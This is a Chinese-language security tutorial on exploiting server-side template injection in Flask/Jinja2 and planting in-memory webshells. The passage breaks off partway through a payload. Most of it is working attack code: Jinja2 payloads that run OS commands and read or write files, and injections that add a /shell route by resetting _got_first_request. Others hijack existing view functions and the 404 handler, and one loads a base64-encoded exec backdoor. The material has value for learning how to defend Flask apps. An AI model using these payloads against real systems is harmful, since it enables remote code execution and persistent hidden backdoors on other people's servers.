# 前言
前段时间在看内存马相关内容时，发现python方面的资料不是很多，感觉可能是python web本来就少没那么热门，能够拿到shell的方法也不多。但是还是在SSTI的漏洞利用基础上探索了一些新姿势。
在 websocket 那节纯纯尝试，实战中几乎没有用。
# SSTI相关
Flask 框架默认使用 Jinja2 作为模板引擎来动态的渲染网页。
关于 SSTI 已经有了不少优秀的文章，这里只是说一下个人理解和折腾。
SSTI 一般的的 Payload 形如（不讨论绕过的情况）：
```python
{{''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("calc").read()')}}

{{''.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__['os'].popen('calc').read()}} 

{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('ls /').read()}}
```
 Jinja2 模板引擎中不能直接调用 Python 模块中的方法，但是为了实现动态渲染 Jinja2 模板引擎可以访问一些 Python 中的内置变量和函数，常见的内置变量和函数包括：

- 布尔值: `True` 和 `False`
- 空值: `None`
- 数据类型: `list/[]`, `dict/{}`, `tuple/()`, `set()`
- 函数: `range`以及一些魔术方法

同时在 Jinja2 中，如果在模板中引用了一个不存在的变量，那么会返回一个 `jinja2.runtime.Undefined`对象，而不会触发异常。在P神的《Python 格式化字符串漏洞（Django为例）》一文中提到 SSTI 实际上就是字符串格式化漏洞，如果可以控制被格式化的字符串，就可以通过注入拼接字符串在格式化时访问到内部的变量，对应到 Jinja2 中就需要能够控制模板的内容。
```python
>>> string = 'Hi {user}' + commonds' 2024'
>>> string.format(user='Jack')
'Hi Jack 2024'
>>> b = input()
 {user}
>>> string = 'Hi {user}' + b
>>> string
'Hi {user} {user}'
>>> string.format(user='Jack')
'Hi Jack Jack'
```
所以在上面常见的 Payload 中，都是拿到一个`Object`后，寻找其子类中导入了危险模块或者存在危险方法导致可以直接或者间接调用执行代码/命令。由于 Python 万物皆对象 —— 数字、字符串、元组、列表、字典等所有内置数据类型， 函数 、方法 、 类 、模块，在 Python 中所有的一切都是对象并使用对象模型来存储数据。于是可以通过链式访问 Python 对象的特殊属性和调用魔术方法来寻找可用的子类。
由 @hosch3n 师傅给出的思路：
> 思路一：如果 object 的某个派生类中存在危险方法，就可以直接拿来用
> 思路二：如果 object 的某个派生类导入了危险模块，就可以链式调用危险方法
> 思路三：如果 object 的某个派生类由于导入了某些标准库模块，从而间接导入了危险模块的危险方法，也可以通过链式调用


**寻找导入了危险方法可以直接调用的**
如：文件读写 的一些方法，在 Python3 中重构了** I/O **子系统，所以文件对象变为了 `_io`，先找到基类`_IOBase`，然后寻找其子类`_io._RawIOBase`的子类`_io.FileIO`，利用这个类来读写文件。或者使用`FileLoader.get_data()`
```python
[].__class__.__base__.__subclasses__()[101].__subclasses__()[0].__subclasses__()[0]('C:/Windows/win.ini').read()
[].__class__.__base__.__subclasses__()[101].__subclasses__()[0].__subclasses__()[0]('C:/f.txt','w+').write('string'.encode('utf-8'))

[].__class__.__base__.__subclasses__()[94]['get_data']('','C:/Windows/win.ini')
```
这里可以直接找基类，也可以找到`_io`后遍历子类
```python
{% set tmp = namespace(idx=0, obj=''.__class__.__bases__[0], fs=['_IOBase', 'FileLoader']) %}
{% for k in tmp.obj.__subclasses__() %}
{% for f in tmp.fs %}
{% if f in k.__name__  %}
<li> {{ f }} | {{ k.__class__ }} {{ k.__module__ }} {{ k.__name__ }} | {{ tmp.idx }} </li>
{% endif %}
{% endfor %}
{% set tmp.idx = tmp.idx + 1 %}
{% endfor %}
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717742686017-e75b03dd-618b-4e04-95c2-62f3839dec9d.png#averageHue=%23eef0f4&clientId=u15af632c-5e6d-4&from=paste&height=434&id=u7459a7cb&originHeight=542&originWidth=1876&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93968&status=done&style=none&taskId=uf33b8db8-7661-4cb0-aa2a-07f38b76c12&title=&width=1500.8)

**寻找直接或间接导入了危险模块从而调用危险方法的以及可以导入其他模块的**
如：`os` `sys` `subprocess` `importlib` `linecache``_collections_abc` `timeit`
找到模块后调用就行，下面的Payload是后面部分，前面加上模块对应的子类`''.__class__.__bases__[0].__subclasses__()[id]`，其实都是围绕这`os subprocess`来做
```python
# os
.__init__.__globals__['os'].popen('id').read()

# sys
.__init__.__globals__['sys'].modules['os'].popen('id').read()

# subprocess
.__init__.__globals__['subprocess'].call('calc') # 无回显
.__init__.__globals__['subprocess'].run('id', stdout=-1).__dict__['stdout'].strip().decode('utf-8',  errors='replace')
.__init__.__globals__['subprocess'].Popen('whoami',shell=True,stdout=-1).communicate()[0].strip().decode('utf-8', errors='replace')
.__init__.__globals__['subprocess'].check_output('id').strip().decode('utf-8', errors='replace')

# importlib
.__init__.__globals__['importlib']["import_module"]("os")["popen"]("id").read()

# linecache 
.__init__.__globals__['linecache']['sys'].modules['os'].popen('id').read()
```
寻找导入了危险模块的类
```python
{% set tmp = namespace(idx=0, obj=''.__class__.__bases__[0], ms=['os','sys','subprocess']) %}
{% for k in tmp.obj.__subclasses__() %}
{% if '__globals__' in tmp.obj.__dir__( k.__init__ ) %}
{% for m in tmp.ms %}
{% if m in k.__init__.__globals__.keys() %}
<li>{{ m }} | {{ k.__class__ }} {{ k.__module__ }} {{ k.__name__ }} | {{ tmp.idx }} </li>
{% endif %}
{% endfor %}
{% endif %}
{% set tmp.idx = tmp.idx + 1 %}
{% endfor %}
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717742661626-e635cc6e-c2ae-4be8-a658-08174d7aa5ad.png#averageHue=%23ebeff3&clientId=u15af632c-5e6d-4&from=paste&height=542&id=u50034b90&originHeight=677&originWidth=1866&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=252329&status=done&style=none&taskId=u0d484ada-ad04-44c9-8a4e-d3161bfe1cb&title=&width=1492.8)
这里有一个比较特殊的模块`__builtins__`，`__builtins__` 模块是 Python 中的一个内置模块，它包含了一些内置函数、异常和类型。这些函数、异常和类型可以在 Python 中直接访问，而不需要导入任何模块。  
所以由这么一个万能的方法：在内建模块里直接调用`eval`或者`exec`函数来执行 Python 代码段，在代码段中导入模块实现命令执行。
```python
[].__class__.__base__.__subclasses__()[id].__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()")
```
关于 Payload 中的方法、属性可以查看 Python 的文档说明
[https://docs.python.org/zh-cn/3/reference/datamodel.html](https://docs.python.org/zh-cn/3/reference/datamodel.html)
参考文章：
[Python 格式化字符串漏洞（Django为例） | 离别歌](https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html)
 [奇安信攻防社区-flask SSTI学习与总结](https://forum.butian.net/share/1371)
[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/topic_detail/241844424828441)

# Flask中的内存马
在 Flask 中有一个`url_for`函数，可以根据视图函数生成一个url，比如在模板中写上如下内容，其中`test`是路由`/test`的视图函数名
```python
<a href="{{ url_for('test', name='123') }}"></a>
```
在访问页面的时候就会出现
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717746142693-a24eab31-1e48-4ba5-92a9-7017b69301ec.png#averageHue=%23ebeef4&clientId=u15af632c-5e6d-4&from=paste&height=104&id=ue0b697d3&originHeight=130&originWidth=429&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=9374&status=done&style=none&taskId=ue95efbe4-3596-437f-a885-197c6037841&title=&width=343.2)
在这个函数的`__globals__`里有一个`current_app`对象，这个对象在 Flask 中作为全局代理对象来访问当前的应用实例，在后面通过 SSTI 实现的内存马的时候，我们就需要先拿到当前运行的 Flask APP 的上下文。然后再调用内建模块中的`eval`和`exec`函数执行代码，这样才能操作这个运行的 Flask APP
```python
url_for.__globals__['current_app']
```
除此之外还有`get_flashed_messages`

想要在 Flask 中实现内存马，要么实现动态的注册路由，要么在请求的前后拦截路由。
Flask 中可以拦截路由的装饰器或者说钩子函数。

- template_filter() 装饰器：用于注册一个模板过滤器，这个过滤器可以在Jinja2模板中使用。
- template_global() 装饰器：于注册一个全局模板变量或函数，使其在所有模板中都可以使用。
- template_test() 装饰器：用于注册一个模板测试，测试可以在模板条件中使用。
- add_template_filter() 装饰器：用于动态添加模板过滤器，与 template_filter() 装饰器功能相同，但更灵活。
- add_template_global() 装饰器：用于动态添加全局模板变量或函数，与 template_global() 装饰器功能相同。
- add_template_test() 装饰器：用于动态添加模板测试，与 template_test() 装饰器功能相同。
- endpoint() 装饰器：用于指定视图函数的端点名称。端点是路由和视图函数的唯一标识符。
- errorhandler() 装饰器：用于注册一个错误处理函数，当特定的HTTP错误发生时调用。
- after_request() 装饰器：用于注册一个函数，该函数会在每次请求之后调用，通常用于修改响应对象。
- before_request() 装饰器：用于注册一个函数，该函数会在每次请求之前执行。
- teardown_request() 装饰器：用于注册一个函数，该函数会在每次请求结束后调用，无论请求是否成功。
- context_processor() 装饰器：用于注册一个上下文处理器，该处理器返回的字典将合并到模板上下文中。
- url_value_preprocessor() 装饰器：用于注册一个函数，该函数会在请求解析URL参数之前调用，可以用于预处理URL参数。
- url_defaults() 装饰器：用于注册一个函数，该函数会在构建URL时调用，通常用于设置URL的默认值。

我们随便进入一个装饰器对应的 Flask 应用实例上的方法，跟到最后都可以发现基本上都是对其对应的数据结构进行操作，比如使用装饰器的时候会向结构体里添加一条，请求的时候遍历获取到对应装饰器的函数然后调用。这个数据结构的类型是`collections.defaultdict`，我们在注入内存马的时候就不需要调用函数，而是直接修改这个数据结构的内容。
下面的方法中，有的是可以针对蓝图来进行的。
## 动态注册路由 @app.route - add_url_rule
Flask 中使用了`@app.route`装饰器来注册路由，其调用的底层函数为：`flask.sansio.scaffold.Scaffold.add_url_rule`。以前网上很多关于 Flask 内存马都是通过这个函数来注册一个路由，比如：
```python
{{ url_for.__globals__['__builtins__']['exec'](
"
app.add_url_rule('/shell', 'shell', lambda: '123');
", 
{'app':url_for.__globals__['current_app']})
}}
```
这个例子调用`exec`函数并传入了当前的 Flask APP 的上下文作为执行代码的**全局命名空间**，所以执行代码部分可以拿到 app 来调用`add_url_rule`注册`/shell`的路由，并且用一个 lambda 表达式作为视图函数。以前的方法是可行的，但是目前（不知道具体版本从哪里开始）会出现这样的提示：
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717748006709-ecf56d30-d8c7-4c25-9d74-35122c323970.png#averageHue=%23ecf0f4&clientId=u15af632c-5e6d-4&from=paste&height=214&id=u2507fdce&originHeight=267&originWidth=1875&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54337&status=done&style=none&taskId=u1b42e37e-2af6-4a8e-8a6c-f6575718018&title=&width=1500)
也就是再目前的版本中 Flask APP 在处理了第一个请求后又尝试对应用进行设置是不允许的，所以`app._check_setup_finished`抛出了异常。
```python
Traceback (most recent call last):
  .......
  File "C:\Users\xxx\AppData\Roaming\Python\Python39\site-packages\flask\sansio\app.py", line 417, in _check_setup_finished
    raise AssertionError(
AssertionError: The setup method 'add_url_rule' can no longer be called on the application. It has already handled its first request, any changes will not be applied consistently.
Make sure all imports, decorators, functions, etc. needed to set up the application are done before running it.
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717749412258-3cb7e3f5-7130-490e-a1a5-ed9fb0a37915.png#averageHue=%231f2024&clientId=u15af632c-5e6d-4&from=paste&height=379&id=u8acce6f8&originHeight=474&originWidth=1132&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=71063&status=done&style=none&taskId=u8ed4a8a1-c8aa-49b5-8b5a-43ff49724e7&title=&width=905.6)
可以看到这个函数只是判断了下`_got_first_request`的值，那么既然现在能够访问到应用上下文，在`add_url_rule`前修改他的值就可以了，先看一下这个上下文里有没有这个变量。
```python
{{ url_for.__globals__['current_app'].__dict__ }}
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717749715204-3327a746-625d-4506-83a9-f11213564df7.png#averageHue=%23eceff3&clientId=u15af632c-5e6d-4&from=paste&height=436&id=ua4e1dade&originHeight=545&originWidth=1876&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=142824&status=done&style=none&taskId=u39a14b17-cd0e-4d85-aa0d-1d7fe58ad6f&title=&width=1500.8)
Ok，直接修改前面的 Payload 即可
```python
{{ url_for.__globals__['__builtins__']['exec'](
"
app._got_first_request=False;
app.add_url_rule('/shell', 'shell', lambda: '<pre>{0}</pre>'.format(__import__('os').popen(request.args.get('cmd')).read())
);
app._got_first_request=True;
", 
{'request':url_for.__globals__['request'], 'app':url_for.__globals__['current_app']})}}
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717749802374-0e113771-6d29-4594-ab34-fc3dfd2b87e4.png#averageHue=%23eef1f4&clientId=u15af632c-5e6d-4&from=paste&height=348&id=u1c290925&originHeight=435&originWidth=1871&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=68586&status=done&style=none&taskId=ua0716d3b-d4b6-4b5d-a3c4-c02eac2f842&title=&width=1496.8)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717749877393-3a45f38c-e259-49c1-b351-d34fe7363482.png#averageHue=%23cfa26b&clientId=u15af632c-5e6d-4&from=paste&height=272&id=ud83a7ace&originHeight=340&originWidth=691&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=64161&status=done&style=none&taskId=udd94021a-7534-4022-9bd0-e85d2f380f7&title=&width=552.8)
### 补充：请求方式和执行结果
在使用这个函数注入内存马后要修改内存马的话，需要获取到原来的匿名函数然后修改。因为再后续修改的话 flask 中有一个判断视图函数和旧的端点对应函数是不是一个，不是的话会抛出异常，函数是`flask.sansio.app.App.add_url_rule`，并且也不止这一种方法，这个函数只是简化了流程，实际上可以直接去操作：`werkzeug.routing.map.Map`和`werkzeug.routing.rules.Rule`这个类以及视图函数结构。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718125824133-145266e1-7139-43cd-954f-ed1e86d5362a.png#averageHue=%231f2024&clientId=uc11acaa6-eb2c-4&from=paste&height=205&id=u183ae064&originHeight=256&originWidth=1152&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39269&status=done&style=none&taskId=u81feb570-6a3c-48a0-a93f-8d1e1e1df31&title=&width=921.6)
指定请求方式和接收参数修改，如果使用`exec`执行代码是没有返回值的，可以使用`eval`，但是`eval`执行不了多行代码。解决这个其实还好，可以多次执行`eval`，也可以在`exec`执行的时候将结果保存到全局变量中，`eval`再去获取。请求方式`add_url_rule`函数是支持的。
```python
{{ url_for.__globals__['__builtins__']['exec'](
"
app._got_first_request=False;
app.add_url_rule('/shell', 'shell', lambda: eval(request.values['cmd']);, methods=['POST','GET']);
app._got_first_request=True;
", 
{'request':url_for.__globals__['request'], 'app':url_for.__globals__['current_app']})}}
```
```python
{{ url_for.__globals__['__builtins__']['exec'](
"
my_func = lambda: eval(request.values['cmd']);
app.view_functions['shell'] = my_func;
app._got_first_request=False;
app.add_url_rule('/shell', 'shell', my_func, methods=['POST','GET']);
app._got_first_request=True;
", 
{'request':url_for.__globals__['request'], 'app':url_for.__globals__['current_app']})}}
```

现在需要修改路由的请求方式，其他的语言的webshell实现的时候基本上都是通过上传文件实现，请求的方式是可控的，就像上面那样定义路由的时候定义了请求的方式。那么如果我们需要在已有的路由上进行内存马注入，并且修改请求方式应该怎么做呢？先看一下路由注册的实现流程。如下有一个`/nonono`路由，没有指定请求方式的时候默认是`GET`（还有框架添加的`HEAD``OPTIONS`），使用`POST`请求的时候显示不允许。
```python
@app.route('/nonono')
def my_view():
    return "Hello, nonono!"
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718129456793-cef6439b-0265-47fd-986f-4ef042fd4852.png#averageHue=%2376b6d9&clientId=uc11acaa6-eb2c-4&from=paste&height=184&id=u3e24f35f&originHeight=230&originWidth=1494&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34865&status=done&style=none&taskId=u87050a96-9b7e-4909-b6da-58af7ed1768&title=&width=1195.2)
这里先跳过了一下默认注册的路由比如`/``/static`，`@app.route`装饰器函数使用了`@setupmethod -- flask.setupmethod`装饰器来校验Flask实例是否开启了debug模式并且获取第一个请求，这里无关紧要，随后调用了`self.add_url_rule(rule, endpoint, f, **options)`这里的调用并不是下面的那个函数`flask.sansio.scaffold.Scaffold.add_url_rule`，而是`flask.sansio.app.App.add_url_rule()`
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718129650900-080e9820-12e3-42db-81d0-2f174a3a174e.png#averageHue=%23202228&clientId=uc11acaa6-eb2c-4&from=paste&height=223&id=udb26ec01&originHeight=279&originWidth=1204&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41429&status=done&style=none&taskId=u70a8f330-1cec-4132-9bc3-43d45ecc372&title=&width=963.2)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718130094711-f5f37419-9468-4ca0-958b-3dc51a8c6f3a.png#averageHue=%23262b35&clientId=uc11acaa6-eb2c-4&from=paste&height=275&id=u117e6737&originHeight=344&originWidth=1132&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47754&status=done&style=none&taskId=u3eca7bb8-6c4e-401a-b8f8-456c08a40f9&title=&width=905.6)
同样在校验后来到这个函数里。就是一些属性的设置，比如添加默认的一些请求方式。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718130216940-f9d8c833-e3c0-44dd-9d85-420aec7d34f4.png#averageHue=%231f2228&clientId=uc11acaa6-eb2c-4&from=paste&height=600&id=u63772f68&originHeight=750&originWidth=1006&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=118607&status=done&style=none&taskId=ue88e662b-1018-4de4-8682-436061675b3&title=&width=804.8)
这个时候将路由实例化为了`werkzeug.routing.rules.Rule`对象，后续就是将这个路由对象添加到 Flask 应用上下文的变量中，这些变量（属性）会在后面用来确定路由和视图函数、端点的对应关系。这个路由对象里没有什么特殊的操作，基本就是各种属性设置了。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718130333652-a447b6a2-3ca6-4a7f-88d9-35ef3b213913.png#averageHue=%23272a30&clientId=uc11acaa6-eb2c-4&from=paste&height=643&id=uc4b5a368&originHeight=804&originWidth=1140&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=109170&status=done&style=none&taskId=u66dd6867-0d76-46b7-936b-528662a5042&title=&width=912)
单步步过到`self.url_map.add(rule)`这里，`url_map`是`werkzeug.routing.map.Map`对象，这里由于是补充内容忘记提了，`url_map` 在 Flask 应用上下文中还表示路由和端点的对应关系，下文中有说明补充。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718130957213-68832342-a44a-43d7-877d-939b7ff625f2.png#averageHue=%23ecf0f3&clientId=uc11acaa6-eb2c-4&from=paste&height=291&id=u3d708154&originHeight=364&originWidth=1482&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=89226&status=done&style=none&taskId=ud388c472-ce52-4654-98dd-82d18ac2a29&title=&width=1185.6)
这里调用了`werkzeug.routing.map.Map.add()`方法，其实最终就是操作了`_rules_by_endpoint`这个数据结构，以端点名作为键，键值为一个路由类的列表。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718131098660-266adc2a-7a21-4e37-bc9a-a4693774171d.png#averageHue=%2320242c&clientId=uc11acaa6-eb2c-4&from=paste&height=268&id=uec108623&originHeight=335&originWidth=1366&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=67727&status=done&style=none&taskId=u08883d83-bfdd-425b-9a10-acd63293a9c&title=&width=1092.8)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718131224545-0f30ee2d-a80b-4653-ab36-49ef17d1845f.png#averageHue=%23eceff3&clientId=uc11acaa6-eb2c-4&from=paste&height=297&id=ua5128296&originHeight=371&originWidth=1509&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=99912&status=done&style=none&taskId=u4a25a547-0321-45e3-b44a-8f83aa774b7&title=&width=1207.2)
可以看到请求方法的定义是在路由类中实现的，这里看到的形如`'my_view': [<Rule '/nonono' (GET, HEAD, OPTIONS) -> my_view>]`的键值对，这个键值是在路由类中使用了工厂类的迭代器得到的，没有继续跟下去的必要了，反正目前拿到了这个数据结构的位置，就尝试去修改一下，由于是一个迭代得到的需要参考工厂类的实现来做。
现在要修改`/nonono`的请求方法，端点为`my_view`，查看一下这个类里的属性，这样可以避免直接进入到工厂类去跟。这里有一个`methods`属性，是一个集合。
```python
{{ url_for.__globals__['current_app'].url_map._rules_by_endpoint.my_view[0].__dict__ }}
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718131678954-75121415-d974-441d-8ec6-a9e1d24d516d.png#averageHue=%23ebeef3&clientId=uc11acaa6-eb2c-4&from=paste&height=461&id=ue0ddd01e&originHeight=576&originWidth=1500&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=171284&status=done&style=none&taskId=uf834f0ac-79b9-4379-9b0d-3c38b8a50a3&title=&width=1200)
往集合添加一个`POST`再看看，就已经可以对路由进行`POST`请求了。下面的内容中没有提到这一点，所以可以参考这个来修改。
```python
{{ url_for.__globals__['current_app'].url_map._rules_by_endpoint.my_view[0].methods.add('POST') }}

# url_for.__globals__['current_app'].url_map._rules_by_endpoint.端点名/视图函数名[0].methods.add('POST')
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718131838679-e5551532-b877-4722-bca9-aa80280ecebc.png#averageHue=%23acdad9&clientId=uc11acaa6-eb2c-4&from=paste&height=205&id=u8b490a6b&originHeight=256&originWidth=1516&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=50493&status=done&style=none&taskId=ua46705fc-6087-43d3-8c60-e6ab86d9962&title=&width=1212.8)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718131870630-e1061b70-6acd-43ff-826d-92f148b71841.png#averageHue=%2381b28f&clientId=uc11acaa6-eb2c-4&from=paste&height=233&id=u3510f0dd&originHeight=291&originWidth=1504&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61380&status=done&style=none&taskId=u69d2875f-b76b-41de-927b-25fc073c359&title=&width=1203.2)

---

对于执行结果，Python 中 `eval` 函数有返回值，但是只能执行单行代码，`exec` 函数可以执行多行代码，但是返回值永远为空。Flask 在遇到视图函数返回值为空的时候会直接抛出异常。对于实现内存马来说我们需要的还是代码执行而不光是一个 cmdshell。
如果需要执行多行代码并且返回结果的话，一种是不使用 lambda 函数作为视图函数，这需要我们在 SSTI 漏洞利用的时候使用 `exec` 函数，这样可以直接写上需要的函数作为视图函数。
```python
{{ url_for.__globals__['__builtins__']['exec'](
"
def my_func():
    data = 'hello'
    return data
app.view_functions['shell'] = my_func;
app._got_first_request=False;
app.add_url_rule('/shell', 'shell', my_func, methods=['POST','GET']);
app._got_first_request=True;
", 
{'request':url_for.__globals__['request'], 'app':url_for.__globals__['current_app']})}}
```
或者将函数编码后，使用 `exec` 执行定义函数的部分，这样视图函数（内存马）也就注册了。
比如下面这个`my_func`函数就是内存马部分：接收一个`cmd`作为执行的 Payload，在使用`exec`函数的时候可以为其执行代码传递`globals`命名空间对应`parma`，`parma['resp']`就是获取执行的 Payload 结果。
```python
def my_func():
    import base64
    parma = {'resp': None}
    if 'cmd' in request.values:
        p_code = base64.b64decode(request.values['cmd'])
        exec(p_code, parma)
    return parma['resp']
```
那么 Payload 就可以像编写 py 脚本一样了，尽量使用自带库完成，将结果放到 `resp`中。
```python
import os
def cmd_run():
    return os.popen('whoami').read()
resp = cmd_run()
```
注入内存马可以这样来：
```python
{{ url_for.__globals__['__builtins__']['exec'](
"
exec(__import__('base64').b64decode('CmRlZiBteV9mdW5jKCk6CiAgICBpbXBvcnQgYmFzZTY0CiAgICBwYXJtYSA9IHsncmVzcCc6IE5vbmV9CiAgICBpZiAnY21kJyBpbiByZXF1ZXN0LnZhbHVlczoKICAgICAgICBwX2NvZGUgPSBiYXNlNjQuYjY0ZGVjb2RlKHJlcXVlc3QudmFsdWVzWydjbWQnXSkKICAgICAgICBleGVjKHBfY29kZSwgcGFybWEpCiAgICByZXR1cm4gcGFybWFbJ3Jlc3AnXQo='))
app.view_functions['shell'] = my_func;
app._got_first_request=False;
app.add_url_rule('/shell', 'shell', my_func, methods=['POST','GET']);
app._got_first_request=True;
", 
{'request':url_for.__globals__['request'], 'app':url_for.__globals__['current_app']})}}
```
执行 Payload 就将 py 代码 base64 编码后传入即可
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718246956310-3c7acc0f-3a44-494c-b5ed-fec2024e0b21.png#averageHue=%2376b6db&clientId=ua0d5e07c-5e84-4&from=paste&height=217&id=u31b9103f&originHeight=271&originWidth=1872&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=74928&status=done&style=none&taskId=u21f92589-15c7-4af9-8f62-1da038a5570&title=&width=1497.6)

获取 session
```python
{{ url_for.__globals__.session.get('test') }}

Payload = """
def shell_func():
    return gl['session'].get('test')
resp = shell_func()
"""
```
## 修改视图函数 @app.endpoint
这个装饰器是用来建立视图函数和路由之间的关系，底层操作的是数据`view_functions`，用法如下，这种用法
```python
app.add_url_rule("/", endpoint="index")

@app.endpoint("index")
def index():
    ...
```
在一个请求开始进行处理的时候，会在`flask.app.Flask.dispatch_request`函数中从`view_functions`中找到对应的视图函数来进行处理，我们可以通过`url_for.__globals__['current_app'].__dict__['url_map']`来查看当前应用上下文中的`endpoint`和路由的对应关系，也就知道了有哪些`endpoint`，如果没有设置`endpoint`，那么默认就是其视图函数名，可以通过`url_for.__globals__['current_app'].__dict__['view_functions']`查看视图函数，这样可以区别出哪些是`endpoint`，哪些是视图函数。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717758459970-b0bf9875-c6ac-46f6-b684-d04da849d689.png#averageHue=%231f2024&clientId=u15af632c-5e6d-4&from=paste&height=537&id=u9ffd8d70&originHeight=671&originWidth=1204&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=125506&status=done&style=none&taskId=ue92d95f8-c031-427e-81ea-100567da6bd&title=&width=963.2)
比如这里有一个`hello_endpoint`对应路由`/hello`，对应的视图函数是`hello_world`
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717760828584-850bdbfa-7d86-455e-909c-2c18389db888.png#averageHue=%237eb4d3&clientId=u15af632c-5e6d-4&from=paste&height=240&id=udf00c597&originHeight=300&originWidth=1877&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=91018&status=done&style=none&taskId=ube4c9bf9-b0d1-4fc2-8658-e63f0b8bccb&title=&width=1501.6)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717761068508-e573e93d-69c1-4a3c-99d8-afbaa281db5e.png#averageHue=%23ebeff3&clientId=u15af632c-5e6d-4&from=paste&height=290&id=u974f2a99&originHeight=362&originWidth=1866&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=97119&status=done&style=none&taskId=u51182c7a-be73-4b30-82cb-43d07f06a49&title=&width=1492.8)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717758865958-daf4532d-194a-418c-a6e6-e6170157aab3.png#averageHue=%23fbfbb2&clientId=u15af632c-5e6d-4&from=paste&height=113&id=uff4b0511&originHeight=141&originWidth=671&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6048&status=done&style=none&taskId=ue9180aa3-b3a1-4245-a0ec-684a00287ad&title=&width=536.8)
由于直接修改的话会导致这个路由都变成内存马，因为这里是直接调用了视图函数处理返回，而不是在视图函数前后处理。我们可以通过如下 Payload 修改其视图函数，实现`/hello`上的内存马的同时不影响原来的页面
```python
{{ url_for.__globals__['__builtins__']['exec'](
"
app.backup_func=app.view_functions['hello_endpoint'];
app.view_functions['hello_endpoint']=lambda : __import__('os').popen(request.args.get('cmd')).read() if 'cmd' in request.args.keys() is not None else app.backup_func()
", 
{'request':url_for.__globals__['request'], 'app':url_for.__globals__['current_app']}) }}

# 直接
app.view_functions['hello_endpoint']=lambda : __import__('os').popen(request.args.get(request.args.get('cmd'))).read()
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717761732064-34575cd6-e3b3-4c7f-b96d-3c7f835be24a.png#averageHue=%23f8f8b6&clientId=u15af632c-5e6d-4&from=paste&height=322&id=u806a20f4&originHeight=402&originWidth=855&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38912&status=done&style=none&taskId=u8279b0b0-fed8-4628-9b5a-594ad95c901&title=&width=684)

## 请求拦截路由内存马
### @app.errorhandler
这个装饰器用于注册一个错误处理函数，当特定的 HTTP 错误发生时调用。其最终操作的数据是`error_handler_spec`用法如下
```python
@app.errorhandler(404)
def page_not_found(error):
    return 'This page does not exist', 404
```
当发生请求错误的时候，会调用`flask.sansio.app.App._find_error_handler`的函数遍历`error_handler_spec`找到对应错误的处理函数。可以通过`url_for.__globals__['current_app'].__dict__['error_handler_spec']`查看有没有错误处理函数。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1717762399826-7c1b71af-fdc9-4e19-9166-e44623aea28a.png#averageHue=%231e2023&clientId=u15af632c-5e6d-4&from=paste&height=540&id=u07a176be&originHeight=675&originWidth=1185&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=89524&status=done&style=none&taskId=u91941adf-d3e9-4571-b3ee-415885e6035&title=&width=948)

使用下面的 Payload 可以实现针对`404`错误的内存马，当访问一个不存在的路由就会触发。
```python
{{ url_for.__globals__['__builtins__']['exec'](
"
app.backup_errfunc=app.error_handler_spec[None][404][app._get_exc_class_and_code(404)[0]];
